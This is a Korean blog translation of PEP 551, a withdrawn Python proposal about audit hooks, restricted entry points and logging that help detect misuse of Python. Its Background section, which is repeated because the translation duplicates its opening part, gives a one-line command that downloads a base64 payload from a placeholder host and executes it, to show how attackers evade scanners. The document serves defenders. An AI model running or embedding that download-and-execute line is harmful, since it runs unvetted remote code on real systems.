---
title: "[Withdrawn] PEP 551 - Security transparency in the Python runtime"
excerpt: "Python Enhancement Proposal 551: 'Security transparency in the Python runtime'에 대한 한국어 번역입니다."
categories:
  - Python
  - PEP
tags:
  - Python
  - PEP
  - Translation
permalink: /python/pep/551/
toc: true
toc_sticky: true
date: 2025-09-26 23:37:57+0900
last_modified_at: 2025-09-26 23:37:57+0900
published: true
---
> **원문 링크:** [PEP 551 - Security transparency in the Python runtime](https://peps.python.org/pep-0551/)
>
> **상태:** Withdrawn | **유형:** Informational | **작성일:** 23-Aug-2017


## PEP 551 – Python 런타임의 보안 투명성 (Security transparency in the Python runtime)

**저자:** Steve Dower <steve.dower at python.org>
**상태:** 철회됨 (Withdrawn)
**유형:** 정보 제공 (Informational)
**생성일:** 2017년 8월 23일
**Python 버전:** 3.7
**이력:** 2017년 8월 24일, 2017년 8월 28일

**참고:** 이 PEP는 철회되었습니다. 보안 환경에 CPython을 통합하는 방법에 대한 정보는 자체 보안 전문가와 상담하는 것을 권장합니다.

### PEP 578과의 관계

이 PEP는 원래 게시된 이후 두 부분으로 나뉘었습니다.

Python 다음 버전에 추가될 감사 API에 대한 내용은 PEP 578을 참조하십시오.

이 문서는 이제 Python을 보안 또는 감사 환경에 통합하려는 사람들에게 지침을 제공하는 정보 제공용 PEP입니다.

### 개요 (Abstract)

이 PEP는 보안 투명성(security transparency)의 개념과 이것이 Python 런타임에 어떻게 적용되는지를 설명합니다. 런타임이 수행하는 작업에 대한 가시성은 Python을 다른 보안 및/또는 모니터링 환경에 통합하는 데 매우 중요합니다.

PEP 578에 설명된 감사 훅(audit hooks)은 Python 오용을 탐지, 식별 및 분석하는 데 필수적인 구성 요소입니다. 훅 자체는 중립적이지만(보고된 모든 이벤트가 본질적으로 오용인 것은 아님), 전체 시스템 또는 네트워크를 모니터링하는 책임자에게 필수적인 컨텍스트를 제공합니다. 충분한 투명성을 확보하면 공격자는 더 이상 숨을 수 없습니다.

### 배경 (Background)

소프트웨어 취약점은 일반적으로 원격 또는 권한 상승 코드 실행을 가능하게 하는 버그로 간주됩니다. 그러나 현대의 연결된 세상에서는 더 위험한 취약점이 고급 지속 위협(Advanced Persistent Threats, APT)을 가능하게 하는 것입니다. APT는 공격자가 네트워크에 침투하여 하나 이상의 머신에 소프트웨어를 설치하고, 시간이 지남에 따라 데이터 또는 정보를 추출할 때 발생합니다. 일부 APT는 악의적으로 데이터를 손상시키거나(예: WannaCrypt) 하드웨어를 손상시킴으로써(예: Stuxnet) 스스로를 드러낼 수 있습니다. 대부분은 그 존재를 숨기고 탐지를 피하려고 합니다. APT는 종종 전통적인 취약점, 사회 공학(social engineering), 피싱(phishing) 또는 스피어 피싱(spear-phishing), 철저한 네트워크 분석, 그리고 잘못 구성된 환경에 대한 이해를 조합하여 스스로를 구축하고 작업을 수행합니다.

최초로 감염된 머신이 최종 목표가 아닐 수 있으며 특별한 권한이 필요하지 않을 수도 있습니다. 예를 들어, 개발자 머신에서 비관리자 사용자로 설정된 APT는 정상적인 배포 채널을 통해 프로덕션 머신으로 확산될 수 있습니다. APT가 가능한 한 많은 머신에 지속적으로 존재하여 제거하기 어렵게 만드는 것은 흔한 일입니다.

공격자가 직접적인 피해를 입히거나 흔적을 숨기려 하든, 탐지를 가로막는 가장 큰 장벽은 통찰력 부족입니다. 대규모 네트워크를 가진 시스템 관리자는 분산 로그에 의존하여 머신이 무엇을 하는지 파악하지만, 로그는 종종 오류 조건만 표시하도록 필터링됩니다. 탐지를 피하려는 APT는 오류나 비정상적인 이벤트를 거의 생성하지 않습니다. 정상적인 운영 로그를 검토하는 데는 상당한 노력이 필요하지만, 여러 회사에서 운영 로그 내에서 자동 이상 징후 탐지를 가능하게 하기 위한 작업이 진행 중입니다. 공격자들이 선호하는 도구는 이미 대상 머신에 설치되어 있는 도구인데, 이는 이러한 도구의 로그 메시지가 정상적인 사용에서는 종종 예상되고 무시되기 때문입니다.

이 시점에서 APT의 존재 또는 이 PEP에 적용되지 않는 방법 및 완화책에 대한 추가 논의는 하지 않겠습니다. 해당 분야에 대한 자세한 정보는 '추가 자료(Further Reading)'에 나열된 자료를 읽거나 시청하는 것을 권장합니다.

Python은 서버 및 개발자 머신에 널리 보급되어 있고, 데이터(네이티브 바이너리와 달리)로 제공되는 임의 코드를 실행할 수 있으며, 내부 감사 기능이 전혀 없기 때문에 공격자에게 특히 흥미로운 도구입니다. 이로 인해 공격자는 단일 명령으로 악성 코드를 다운로드, 해독 및 실행할 수 있습니다.

```python
python -c "import urllib.request, base64; exec(base64.b64decode( urllib.request.urlopen('http://my-exploit/py.b64') ).decode())"
```

이 명령은 현재 네트워크 연결을 통해 읽히거나 디스크에 기록되는 식별 가능한 코드에 의존하는 대부분의 안티-맬웨어 스캐너를 우회합니다(base64는 이러한 검사를 우회하기에 종종 충분합니다). 또한 파일 접근 제어 목록(ACL) 또는 권한(파일 접근 없음), 승인된 애플리케이션 목록(Python이 다른 용도로 승인되었다고 가정), 자동 감사 또는 로깅(Python이 인터넷에 접근하거나 페이로드(payload)를 얻기 위해 로컬 네트워크의 다른 머신에 접근하는 것이 허용된다고 가정)과 같은 보호 기능을 우회합니다.

보안 커뮤니티의 일반적인 합의는 공격을 완전히 방지하는 것은 불가능하며, 방어자는 공격이 성공한 후에야 탐지할 수 있다고 가정해야 한다는 것입니다. 이는 "assume breach" (침해 가정) 사고방식으로 알려져 있습니다. 이 시나리오에서는 샌드박싱(sandboxing) 및 입력 유효성 검사(input validation)와 같은 보호 기능이 이미 실패했으며, 중요한 작업은 악성 코드의 탐지, 추적 및 최종 제거입니다. 이를 위해 Python에서 요구되는 주요 기능은 보안 투명성(security transparency)입니다. 이는 Python 런타임이 비정상적이거나 악의적인 사용을 나타낼 수 있는 어떤 작업을 수행하는지 볼 수 있는 능력입니다. 이러한 사용을 방지하는 것도 중요하지만, 발생하고 있다는 사실을 아는 것이 더 우선순위입니다.

중요도가 높아지는 순서대로 목표를 요약하면 다음과 같습니다.
*   악의적인 사용 방지는 가치 있습니다.
*   악의적인 사용 탐지는 중요합니다.
*   탐지 우회 시도 탐지는 매우 중요합니다.

이러한 문제를 해결한 스크립팅 엔진의 한 가지 예는 PowerShell이며, 최근 투명성과 방지라는 유사한 목표를 향해 강화되었습니다.

일반적으로 애플리케이션 및 시스템 구성은 스크립팅 엔진 내에서 어떤 이벤트가 로깅할 가치가 있는지 결정합니다. 그러나 많은 로그 이벤트의 가치가 공격이 탐지된 후에야 인식된다는 점을 고려할 때, 가능한 한 많은 것을 캡처하고 소스에서 필터링하는 대신 뷰를 필터링하는 것이 중요합니다(추가 자료의 'No Easy Breach' 비디오 참조). 항상 관심 있는 이벤트에는 감사 우회 시도, 올바르게 서명되지 않거나 접근 제어가 되지 않은 코드 로드 및 실행 시도, 디버깅 또는 프로세스 간 검사 도구와 같은 비정상적인 운영 체제 기능 사용, 대부분의 네트워크 접근 및 DNS 확인, 로컬 머신에 파일 또는 구성 설정을 생성하고 숨기려는 시도 등이 포함됩니다.

요약하자면, 방어자는 비정상적이거나 악의적인 사용을 탐지하기 위해 Python의 특정 사용을 감사해야 합니다. PEP 578을 통해 Python 런타임은 이를 제공할 수 있는 능력을 얻습니다. 이 PEP의 목표는 시스템 관리자가 기존 감사 및 보호 시스템과 통합할 수 있는 보안 투명한 버전의 Python을 배포하는 데 도움을 주는 것입니다.

Windows에서는 PEP 578에서 추가된 훅을 통해 통합될 수 있는 특정 기능에는 다음이 포함됩니다.
*   스크립트 블록 로깅 (Script Block Logging)
*   DeviceGuard
*   AMSI (Antimalware Scan Interface)
*   영구 영역 식별자 (Persistent Zone Identifiers)
*   이벤트 추적 (Event tracing) (이벤트 전달 포함)

Linux에서는 통합될 수 있는 특정 기능은 다음과 같습니다.
*   gnupg
*   sd_journal
*   OpenBSM
*   syslog
*   auditd
*   SELinux labels
*   가져온 모듈에 대한 실행 비트 확인 (check execute bit on imported modules)

macOS에서는 통합될 수 있는 일부 기능은 다음과 같습니다.
*   OpenBSM
*   syslog

전반적으로, 프로덕션 머신에서 이러한 플랫폼별 기능을 활성화하는 능력은 시스템 관리자에게 매우 매력적이며 Python을 애플리케이션 개발자에게 더욱 신뢰할 수 있는 의존성(dependency)으로 만들 것입니다.

진정한 보안 투명성은 Python 단독으로는 완전히 달성할 수 없습니다. 런타임은 원하는 만큼 많은 이벤트를 감사할 수 있지만, 로그가 검토되고 분석되지 않으면 가치가 없습니다. Python은 보안을 위해 제한을 부과할 수 있지만, 사용성(usability)이 저하될 수 있습니다. 다른 플랫폼과 환경은 특정 보안 기능에 대해 다른 구현을 요구할 것이며, 런타임을 완전히 사용자 정의할 리소스가 있는 조직은 그렇게 하도록 장려되어야 합니다.

### 요약 권장 사항 (Summary Recommendations)

이 권장 사항들은 이후 섹션에서 더 자세히 논의되지만, 전체 논의의 틀을 잡기 위해 여기에 제시됩니다.

*   시스템 관리자는 공격 노출 영역(surface area)을 줄이고 감사 훅을 안전하게 활성화하기 위해 ( `python.exe` 또는 `pythonX.Y` 외에) 대체 진입점(entry point)을 제공하고 사용해야 합니다. 제한될 수 있는 내용에 대한 논의는 '진입점 제한(Restricting the Entry Point)' 섹션에 있습니다.
*   시스템 관리자는 파일 권한, 접근 제어 목록(ACL) 및 서명 유효성 검사(signature validation)와 같이 운영 체제에서 제공하는 모든 사용 가능한 조치를 사용하여 Python 설치 파일의 수정 방지를 해야 합니다.
*   시스템 관리자는 모든 것을 로깅하고 가능한 한 빨리 로그를 중앙 위치로 수집해야 합니다. 외부 시스템(outer-ring machines)에 로그를 보관하는 것을 피해야 합니다.
*   시스템 관리자는 오용 **방지(prevention)**보다 오용 **탐지(detection)**에 우선순위를 두어야 합니다.

### 진입점 제한 (Restricting the Entry Point)

머신에 Python이 존재함으로써 드러나는 주요 취약점 중 하나는 시스템에 의한 탐지나 검증 없이 임의의 코드를 실행할 수 있다는 것입니다. 기본 진입점(`Windows`의 `python.exe` 및 다른 플랫폼의 `pythonX.Y`)은 명령줄, 표준 입력에서 실행을 허용하고 기본적으로 활성화된 훅이 없기 때문에 이러한 작업이 훨씬 쉬워집니다.

우리의 권장 사항은 프로덕션 머신은 기본 진입점 대신 수정된 진입점을 사용해야 한다는 것입니다. 개발 환경 밖에서는 기본 진입점에서 제공하는 유연성이 필요한 경우는 거의 없습니다.

이 섹션에서는 프로덕션 머신에 권장되는 수준의 보안 투명성을 제공하는 가상의 `spython` 진입점(`Windows`의 `spython.exe`, 다른 플랫폼의 `spythonX.Y`)에 대해 설명합니다. 관련 예제 구현은 여기에 설명된 많은 기능을 보여주지만, 플랫폼별 코드(platform-specific code)를 피하기 위한 몇 가지 양보가 있습니다. 충분한 구현은 본질적으로 플랫폼별 보안 기능과의 일부 통합을 필요로 할 것입니다.

공식 배포판은 기본적으로 `spython`을 포함하지 않지만, 서드파티 배포판은 동일한 이름을 사용하는 적절하게 수정된 진입점을 포함할 수 있습니다.

#### 대부분의 명령줄 인자 제거 (Remove most command-line arguments)

`spython` 진입점은 스크립트 파일이 첫 번째 인자로 전달되어야 하며, 그 앞에 어떤 옵션도 허용하지 않습니다. 이는 인-메모리 데이터(in-memory data) 또는 비스크립트 파일(예: `-m pickle <path>`를 사용하여 실행될 수 있는 피클(pickles))로부터의 임의 코드 실행을 방지합니다.

옵션 `-B`(바이트코드 작성 안 함), `-E`(환경 변수 무시), `-s`(사용자 사이트 없음)는 가정됩니다.

`._pth` 접미사를 가진 프로세스와 동일한 전체 경로를 가진 파일(Windows의 `spython._pth`, Linux의 `spythonX.Y._pth`)이 존재하면, 현재 Windows에 대해 설명된 규칙에 따라 `sys.path`를 초기화하는 데 사용됩니다.

데모를 위해 `spython`의 예제 구현은 대화형 모드로 시작하기 위한 `-i` 옵션도 허용합니다. 이는 제한된 진입점에는 권장되지 않습니다.

#### 감사된 이벤트 로깅 (Log audited events)

초기화 전에 `spython`은 모든 감사된 이벤트를 OS 관리 로그 파일에 기록하는 감사 훅을 설정합니다. Windows에서는 이벤트 추적(Event Tracing) 기능이고, 다른 플랫폼에서는 `syslog`로 전송됩니다. 공격자가 로컬 로그를 지우거나 머신에 대한 정당한 접근을 방지하려는 시도에 대비하여 정보 손실을 방지하기 위해 로그는 가능한 한 자주 머신에서 복사됩니다.

감사 훅은 또한 `sys.addaudithook`의 모든 이벤트를 중단하여 다른 훅이 추가되는 것을 방지합니다.

로깅 훅은 네이티브 코드(native code)로 작성되며 인터프리터가 초기화되기 전에 구성됩니다. 이것이 감사 없이 Python 코드가 실행되지 않고, Python 코드가 훅 등록을 방지할 수 없도록 보장할 수 있는 유일한 기회입니다.

우리의 주요 목표는 모든 Python 프로세스가 취한 모든 작업을 기록하여, 기록된 이벤트를 기반으로 오프라인에서 탐지를 수행할 수 있도록 하는 것입니다. 모든 이벤트가 기록되면 더 심층적인 분석 및 머신 러닝(machine learning) 알고리즘 사용이 가능합니다. 이는 공격자가 일정 기간 동안 보호된 머신 내에 머무르려는 지속적인 공격을 탐지하는 데 유용하며, 성공적인 공격으로 인한 영향과 노출을 파악하기 위한 사후 분석에도 유용합니다.

`spython`의 예제 구현은 데모를 위해 로컬 머신의 로그 파일에 기록합니다. `-i`로 시작하면 예제 구현은 모든 감사 이벤트를 로그 파일 대신 표준 오류(standard error)에 기록합니다. `SPYTHONLOG` 환경 변수를 사용하여 로그 파일 위치를 지정할 수 있습니다.

#### 가져올 수 있는 모듈 제한 (Restrict importable modules)

또한 초기화 전에 `spython`은 `os.open_for_import`로 열린 모든 파일을 검증하는 `open-for-import` 훅을 설정합니다. 이 구현은 모든 파일이 `.py` 접미사를 가져야 하며(캐시된 바이트코드(bytecode) 사용 방지), `(filename, True_if_allowed)`를 포함하는 사용자 정의 감사 이벤트 `spython.open_for_import`를 발생시킵니다.

파일을 연 후, 전체 내용은 단일 버퍼(buffer)로 메모리에 읽히고 파일은 닫힙니다.

컴파일은 나중에 컴파일 이벤트(compile event)를 트리거하므로, 동적으로 생성된 코드에도 적용되는 메커니즘을 사용하여 현재 내용을 검증할 필요는 없습니다. 그러나 소스 파일 또는 파일 해시(hash)의 화이트리스트(whitelist)를 사용할 수 있는 경우, DeviceGuard와 같은 다른 유효성 검사 메커니즘을 여기에서 수행해야 합니다.

#### 피클(pickles)의 전역 변수 제한 (Restrict globals in pickles)

`spython` 진입점은 기본 구현을 사용하는 모든 `pickle.find_class` 이벤트를 중단합니다. 재정의(Overrides)는 명시적으로 추가되지 않는 한 감사 이벤트를 발생시키지 않으므로 계속 허용됩니다.

#### `os.system` 방지 (Prevent os.system)

`spython` 진입점은 모든 `os.system` 호출을 중단합니다.

여기서 `subprocess.Popen(shell=True)`는 허용된다는 점에 유의해야 합니다(플랫폼별 프로세스 생성 이벤트를 통해 로깅되지만). 이 절충은 실행 중인 애플리케이션이 단일 문자열 인자를 가진 `os.system`을 호출하도록 유도하는 것이 여러 인자를 가진 함수를 호출하는 것보다 훨씬 간단하며, 따라서 익스플로잇(exploit)의 일부로 사용될 가능성이 더 높기 때문에 이루어집니다. `os.system`을 프로덕션 코드에서 사용할 정당한 이유는 거의 없지만, `subprocess.Popen`은 많은 정당한 사용 사례를 가지고 있습니다. 그러나 `shell=True` 인자 사용을 나타내는 로그는 더 신중하게 조사되어야 합니다.

시스템 관리자는 제한과 탐지 사이에서 이러한 종류의 절충을 해야 하며, 일반적으로 탐지를 선호해야 합니다.

### 일반 권장 사항 (General Recommendations)

이전 섹션에서 제시된 것 이상의 권장 사항은 어렵습니다. 어떤 환경에 대한 이상적인 구성은 시스템 관리자가 자체 네트워크의 활동을 관리, 모니터링 및 응답하는 능력에 달려 있기 때문입니다. 그럼에도 불구하고, 여기서는 Python을 완전한 시스템에 통합하기 위한 몇 가지 맥락과 지침을 제공하려고 합니다.

이 섹션은 `should`(또는 `should not`)를 사용하여 조언을 무시하는 것이 위험하다고 간주하고, `may`를 사용하여 고가치 시스템에 대해 조언을 고려해야 함을 나타내는 권장 사항을 제공합니다. `sysadmin`이라는 용어는 네트워크 전체에 Python을 배포할 책임이 있는 사람을 지칭합니다. 다른 조직에서는 책임자를 다른 직함으로 부를 수 있습니다.

*   시스템 관리자는 자체 진입점을 구축해야 하며, 아마도 `spython` 소스에서 시작하여 환경에서 사용 가능한 보안 시스템과 직접 인터페이스해야 합니다. 통합이 tighter(더 긴밀할)수록 공격자가 해당 시스템을 우회할 수 있는 취약점이 발견될 가능성이 줄어듭니다. 특히, 진입점은 환경 변수와 같이 현재 환경에서 어떤 설정도 얻어서는 안 됩니다. 단, 해당 설정이 다른 방법으로 수정으로부터 보호되는 경우는 예외입니다.
*   감사 메시지는 로컬 파일에 기록해서는 안 됩니다. `spython` 진입점은 예제 및 테스트 목적으로 이를 수행합니다. 프로덕션 머신에서는 `ETW` 또는 `auditd`와 같이 이러한 목적을 위해 고안된 도구를 사용해야 합니다.
*   기본 `python` 진입점은 프로덕션 머신에 배포되어서는 안 되지만, 개발자가 비프로덕션 머신에서 Python을 사용하고 테스트하도록 제공될 수 있습니다. 시스템 관리자는 네트워크에 연결된 모든 시스템이 잠재적인 공격 대상이므로 개발자 머신에 덜 제한적인 버전의 진입점을 배포하는 것을 고려할 수 있습니다. 시스템 관리자는 추가 감사가 포함되어 있다는 사실을 가리기 위해 자체 진입점을 `python`으로 배포할 수도 있습니다.
*   Python 배포는 배포 후 및 사용 중에 사용 가능한 모든 플랫폼 기능을 사용하여 읽기 전용으로 만들어져야 합니다.
*   이를 지원하는 플랫폼에서는 시스템 관리자가 Python 배포의 모든 파일에 서명을 포함해야 하며, 이상적으로는 개인 인증서(private certificate)를 사용하여 검증해야 합니다. 예를 들어, Windows는 실행 파일에 서명을 포함하고 다른 파일에 대한 카탈로그(catalogs)를 사용할 수 있으며, `DeviceGuard`를 사용하여 서명을 자동으로 또는 `open_for_import` 훅을 통해 검증할 수 있습니다.
*   시스템 관리자는 가능한 한 많은 감사 이벤트를 로깅하고, 로컬 머신에서 로그를 자주 복사해야 합니다. 의심스러운 활동에 대해 로그가 지속적으로 모니터링되지 않더라도, 공격이 탐지된 후에는 감사를 활성화하기에는 너무 늦습니다. 감사 훅은 선제적으로 이벤트를 필터링하려고 시도해서는 안 됩니다. 심지어 양성 이벤트도 공격 진행 상황을 분석할 때 유용하기 때문입니다. (이에 대한 더 자세한 내용은 '추가 자료(Further Reading)' 아래의 'No Easy Breach' 비디오를 시청하십시오.)
*   대부분의 작업은 정상적인 사용 중에 발생할 수 있거나, 해당 작업을 방지하면 공격자가 이를 우회하도록 유도할 수 있는 경우 중단되어서는 안 됩니다. 앞서 설명했듯이, 인지(awareness)가 방지(prevention)보다 높은 우선순위입니다. 시스템 관리자는 Python 코드를 감사하고 의도적으로 사용되지 않는 것으로 알려진 작업을 중단할 수 있습니다.
*   감사 훅은 이벤트를 중단하기 전에 로그에 이벤트를 기록해야 합니다. 앞서 논의했듯이, 악의적인 작업을 방지하는 것보다 기록하는 것이 더 중요합니다.
*   시스템 관리자는 이벤트 간의 상관 관계를 식별해야 합니다. 상관 관계가 있는 이벤트의 변경은 오용을 나타낼 수 있기 때문입니다. 예를 들어, 모듈 임포트(module imports)는 일반적으로 `import` 감사 이벤트를 트리거한 다음 `open_for_import` 호출과 일반적으로 `compile` 이벤트를 트리거합니다. 감사를 우회하려는 시도는 종종 이러한 이벤트 중 일부만 억제합니다. 따라서 로그에 `import` 이벤트는 있지만 `compile` 이벤트가 없으면 조사가 필요할 수 있습니다.
*   첫 번째 감사 훅은 `Py_Initialize`가 호출되기 전에 C 코드에서 설정되어야 하며, 해당 훅은 `sys.addloghook` 이벤트를 무조건 중단해야 합니다. Python 인터페이스는 주로 테스트 및 개발을 위한 것입니다.
*   비프로덕션 머신에 감사 훅이 추가되는 것을 방지하기 위해, 진입점은 `sys.addloghook` 이벤트를 중단하지만 그 외에는 아무것도 하지 않는 감사 훅을 추가할 수 있습니다.
*   프로덕션 머신에서는 `Py_Initialize`가 호출되기 전에 C 코드에서 유효성 검사를 하지 않는 `open_for_import` 훅이 설정될 수 있습니다. 이는 이후 코드가 훅을 재정의하는 것을 방지하지만, `setopenforexecutehandler` 이벤트를 로깅하는 것은 유용합니다. 왜냐하면 어떤 코드도 이를 호출할 필요가 없어야 하기 때문입니다. 최소한 `spython`의 `open_for_import` 훅 예제 구현을 사용하는 것이 권장됩니다.
*   `importlib`의 `open_for_import` 사용은 몽키패칭(monkeypatching)으로 쉽게 우회될 수 있으므로, `type` 객체의 속성 변경을 탐지하는 감사 훅을 사용해야 합니다.

### 하지 말아야 할 것 (Things not to do)

이 섹션에서는 우리가 특별히 권장하지 않는 일반적이거나 "명백히 좋은" 권장 사항에 대해 논의합니다. 이는 쓸모없거나 잘못된 것부터 실제 환경에서는 단순히 불가능한 아이디어에 이르기까지 다양합니다.

*   Python 런타임 내에서 샌드박스(sandbox)를 구현하려고 시도하지 마십시오. 임의 코드가 Python 기능을 제한적으로 사용하도록 허용하려는 시도(예:)는 오랜 역사를 가지고 있지만, 일반적인 성공은 없었습니다. 가장 좋은 방법은 하이퍼바이저(hypervisor) 수준의 격리(isolation)를 포함한 샌드박스 환경 내에서 제한 없는 Python을 실행하거나, 권한 없는 코드가 전혀 시작되지 않도록 방지하는 것입니다.
*   사용하기 전에 정적 분석(static analysis)에 의존하여 신뢰할 수 없는 코드를 검증하지 마십시오. 가장 좋은 방법은 코드 서명(code signing)과 같이 신뢰할 수 있는 코드를 사전 승인하고, 불가능한 경우 안티-맬웨어 스캐너와 같이 알려진 악성 코드(known-bad code)를 식별하는 것입니다.
*   이벤트를 먼저 로깅하지 않고 감사 훅을 사용하여 작업을 중단하지 마십시오. 프로세스가 사라진 이유를 알지 못하는 것을 후회하게 될 것입니다.

### 추가 자료 (Further Reading)

*   **Redefining Malware: When Old Terms Pose New Threats** By Aviv Raff for SecurityWeek, 29th January 2014
    *   이 기사와 링크된 기사들은 APT의 부상과 "전통적인" 맬웨어(malware)와의 차이점에 대한 개괄적인 요약입니다.
    *   [http://www.securityweek.com/redefining-malware-when-old-terms-pose-new-threats](http://www.securityweek.com/redefining-malware-when-old-terms-pose-new-threats)

*   **Anatomy of a Cyber Attack** By FireEye, accessed 23rd August 2017
    *   APT가 사용하는 기술에 대한 요약과 관련 백서 링크입니다.
    *   [https://www.fireeye.com/current-threats/anatomy-of-a-cyber-attack.html](https://www.fireeye.com/current-threats/anatomy-of-a-cyber-attack.html)

*   **Automated Traffic Log Analysis: A Must Have for Advanced Threat Protection** By Aviv Raff for SecurityWeek, 8th May 2014
    *   상세 로깅 및 자동 분석의 가치에 대한 개괄적인 요약입니다.
    *   [http://www.securityweek.com/automated-traffic-log-analysis-must-have-advanced-threat-protection](http://www.securityweek.com/automated-traffic-log-analysis-must-have-advanced-threat-protection)

*   **No Easy Breach: Challenges and Lessons Learned from an Epic Investigation** Video presented by Matt Dunwoody and Nick Carr for Mandiant at SchmooCon 2016
    *   APT 탐지 및 제거에 사용된 프로세스와 도구에 대한 자세한 설명입니다.
    *   [https://archive.org/details/No_Easy_Breach](https://archive.org/details/No_Easy_Breach)

*   **Disrupting Nation State Hackers** Video presented by Rob Joyce for the NSA at USENIX Enigma 2016
    *   NSA 맞춤형 접근 작업(Tailored Access Operation) 책임자의 좋은 보안 관행, 기능 및 권장 사항입니다.
    *   [https://www.youtube.com/watch?v=bDJb8WOJYdA](https://www.youtube.com/watch?v=bDJb8WOJYdA)

### 참고 자료 (References)

 Assume Breach Mindset, [http://asian-power.com/node/11144](http://asian-power.com/node/11144)
 PowerShell Loves the Blue Team, also known as Scripting Security and Protection Advances in Windows 10, [https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/](https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/)
 [https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html](https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html)
 (1, 2, 3) [https://aka.ms/deviceguard](https://aka.ms/deviceguard)
 Antimalware Scan Interface, [https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx)
 Persistent Zone Identifiers, [https://msdn.microsoft.com/en-us/library/ms537021(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/ms537021(v=vs.85).aspx)
 (1, 2) Event tracing, [https://msdn.microsoft.com/en-us/library/aa363668(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/aa363668(v=vs.85).aspx)
 [https://www.gnupg.org/](https://www.gnupg.org/)
 [https://www.systutorials.com/docs/linux/man/3-sd_journal_send/](https://www.systutorials.com/docs/linux/man/3-sd_journal_send/)
 (1, 2) [http://www.trustedbsd.org/openbsm.html](http://www.trustedbsd.org/openbsm.html)
 (1, 2) [https://linux.die.net/man/3/syslog](https://linux.die.net/man/3/syslog)
 (1, 2) [http://security.blogoverflow.com/2013/01/a-brief-introduction-to-auditd/](http://security.blogoverflow.com/2013/01/a-brief-introduction-to-auditd/)
 SELinux access decisions [http://man7.org/linux/man-pages/man3/avc_entry_ref_init.3.html](http://man7.org/linux/man-pages/man3/avc_entry_ref_init.3.html)
 The failure of pysandbox [https://lwn.net/Articles/574215/](https://lwn.net/Articles/574215/)

### 감사 (Acknowledgments)

Python 런타임을 프로덕션 사용에 더 안전하게 만드는 데 도움을 준 Microsoft의 모든 분들, 특히 초기 연구, 분석 및 구현의 대부분을 수행한 James Powell, 정보 보안 분야 및 PowerShell의 대응에 대한 귀중한 통찰력을 제공한 Lee Holmes, 그리고 제한적이고 현실적인 토론을 이끌어준 Brett Cannon에게 감사드립니다.

### 저작권 (Copyright)

Copyright (c) 2017-2018 by Microsoft Corporation. 이 자료는 Open Publication License, v1.0 이상(최신 버전은 현재 [http://www.opencontent.org/openpub/](http://www.opencontent.org/openpub/)에서 사용 가능)에 명시된 이용 약관에 따라 배포될 수 있습니다.

이것으로 PEP 551 문서의 번역 및 정리를 마칩니다.## PEP 551 – Python 런타임의 보안 투명성 (Security transparency in the Python runtime)

**저자:** Steve Dower
**상태:** 철회됨 (Withdrawn)
**유형:** 정보 제공 (Informational)
**생성일:** 2017년 8월 23일
**Python 버전:** 3.7

**참고:** 이 PEP는 철회되었습니다. 보안 환경에 CPython을 통합하는 방법에 대한 정보는 자체 보안 전문가와 상담하는 것을 권장합니다.

### PEP 578과의 관계

이 PEP는 원래 게시된 이후 두 부분으로 나뉘었습니다. Python 다음 버전에 추가될 감사 API에 대한 내용은 **PEP 578**을 참조하십시오. 이 문서는 이제 Python을 보안 또는 감사 환경에 통합하려는 사람들에게 지침을 제공하는 정보 제공용 PEP입니다.

### 개요 (Abstract)

이 PEP는 보안 투명성(security transparency)의 개념과 이것이 Python 런타임에 어떻게 적용되는지를 설명합니다. 런타임이 수행하는 작업에 대한 가시성은 Python을 보안 및/또는 모니터링 환경에 통합하는 데 매우 중요합니다.

PEP 578에 설명된 감사 훅(audit hooks)은 Python 오용을 탐지, 식별 및 분석하는 데 필수적인 구성 요소입니다. 이러한 훅은 시스템 또는 네트워크 모니터링 책임자에게 필수적인 컨텍스트를 제공하여 공격자가 숨을 수 없도록 충분한 투명성을 제공합니다.

### 배경 (Background)

소프트웨어 취약점은 일반적으로 원격 또는 권한 상승 코드 실행을 가능하게 하는 버그로 간주되지만, 현대에는 고급 지속 위협(Advanced Persistent Threats, APT)을 가능하게 하는 취약점이 더 위험합니다. APT는 공격자가 네트워크에 침투하여 시스템에 소프트웨어를 설치하고 시간이 지남에 따라 데이터 또는 정보를 추출할 때 발생합니다. 대부분의 APT는 존재를 숨기고 탐지를 피하려고 시도하며, 전통적인 취약점, 사회 공학, 피싱, 철저한 네트워크 분석 및 잘못 구성된 환경에 대한 이해를 조합하여 작동합니다.

시스템 관리자는 대규모 네트워크에서 분산 로그를 통해 머신의 활동을 이해하지만, 로그는 종종 오류 조건만 표시하도록 필터링됩니다. 탐지를 피하려는 APT는 오류나 비정상적인 이벤트를 거의 생성하지 않으므로, 정상적인 운영 로그를 검토하는 데는 많은 노력이 필요합니다. 공격자가 선호하는 도구는 대상 머신에 이미 설치되어 있는 도구인데, 이는 이러한 도구의 로그 메시지가 정상적인 사용에서 종종 예상되고 무시되기 때문입니다.

Python은 서버 및 개발자 머신에 널리 보급되어 있고, 데이터로 제공되는 임의 코드를 실행할 수 있으며, 내부 감사 기능이 없기 때문에 공격자에게 특히 흥미로운 도구입니다. 이는 공격자가 단일 명령으로 악성 코드를 다운로드, 해독 및 실행할 수 있게 합니다.

```python
python -c "import urllib.request, base64; exec(base64.b64decode( urllib.request.urlopen('http://my-exploit/py.b64') ).decode())"
```
이 명령은 대부분의 안티-맬웨어 스캐너와 파일 접근 제어 목록, 승인된 애플리케이션 목록, 자동 감사 또는 로깅과 같은 보호 기능을 우회할 수 있습니다.

보안 커뮤니티는 공격을 완전히 방지하는 것은 불가능하며, 공격이 성공한 후에야 탐지할 수 있다고 가정하는 "assume breach" (침해 가정) 사고방식을 채택하고 있습니다. 이 시나리오에서 중요한 작업은 악성 코드의 탐지, 추적 및 제거입니다. 이를 위해 Python에서 요구되는 주요 기능은 **보안 투명성**입니다. 즉, Python 런타임이 비정상적이거나 악의적인 사용을 나타낼 수 있는 어떤 작업을 수행하는지 볼 수 있는 능력입니다.

중요도가 높아지는 순서대로 목표를 요약하면 다음과 같습니다.
*   악의적인 사용 방지는 가치 있습니다.
*   악의적인 사용 탐지는 중요합니다.
*   탐지 우회 시도 탐지는 매우 중요합니다.

